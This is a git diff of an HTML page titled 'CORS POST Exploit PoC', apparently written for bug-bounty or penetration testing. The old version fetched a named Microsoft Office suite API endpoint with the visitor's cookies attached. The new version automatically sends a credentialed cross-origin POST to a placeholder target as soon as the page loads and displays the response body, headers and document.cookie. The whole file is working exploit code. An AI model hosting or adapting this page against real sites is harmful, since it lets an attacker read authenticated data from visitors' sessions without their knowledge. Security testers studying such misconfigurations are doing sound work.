@@ -1,31 +1,62 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>CORS PoC</title>
-  </head>
-  <body>
-    <h1>CORS PoC</h1>
-    <button onclick="testCORS()">Test CORS</button>
-    <pre id="output"></pre>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS POST Exploit PoC</title>
+</head>
+<body>
+  <h1>CORS POST Exploit PoC</h1>
+  <p><strong>Status:</strong> <span id="status">Waiting…</span></p>
+  <pre id="output" style="white-space: pre-wrap;"></pre>
 
-    <script>
-      function testCORS() {
-        fetch("https://webshell.suite.office.com/api/allapps/GetAllApps?culture=en-us", {
-          method: "GET",
-          credentials: "include" // Include cookies if needed
-        })
-        .then(response => {
-          document.getElementById('output').textContent =
-            `Status: ${response.status}\nHeaders: ${[...response.headers.entries()].map(([k,v]) => k + ': ' + v).join('\n')}`;
-          return response.text();
-        })
-        .then(data => {
-          document.getElementById('output').textContent += `\n\nBody:\n${data}`;
-        })
-        .catch(error => {
-          document.getElementById('output').textContent = `CORS Error: ${error}`;
+  <script>
+    const target = "target"; // Replace with actual endpoint
+    const postData = {
+      // Replace this with the body of your Burp POST request
+      exampleKey: "exampleValue",
+      action: "checkSession"
+    };
+
+    async function runPoC() {
+      document.getElementById("status").textContent = "Sending POST…";
+
+      try {
+        const response = await fetch(target, {
+          method: "POST",
+          mode: "cors",
+          credentials: "include", // Crucial to send cookies/session
+          headers: {
+            "Content-Type": "application/json" // Matches Burp request
+          },
+          body: JSON.stringify(postData)
         });
+
+        const output = {
+          status: response.status,
+          statusText: response.statusText,
+          headers: {},
+          cookiesSent: document.cookie || "(none)"
+        };
+
+        for (let pair of response.headers.entries()) {
+          output.headers[pair[0]] = pair[1];
+        }
+
+        try {
+          output.body = await response.text();
+        } catch (e) {
+          output.body = "(Failed to read body)";
+        }
+
+        document.getElementById("status").textContent = `✅ ${response.status} ${response.statusText}`;
+        document.getElementById("output").textContent = JSON.stringify(output, null, 2);
+      } catch (err) {
+        document.getElementById("status").textContent = "❌ Request failed";
+        document.getElementById("output").textContent = err.toString();
       }
-    </script>
-  </body>
+    }
+
+    runPoC();
+  </script>
+</body>
 </html>
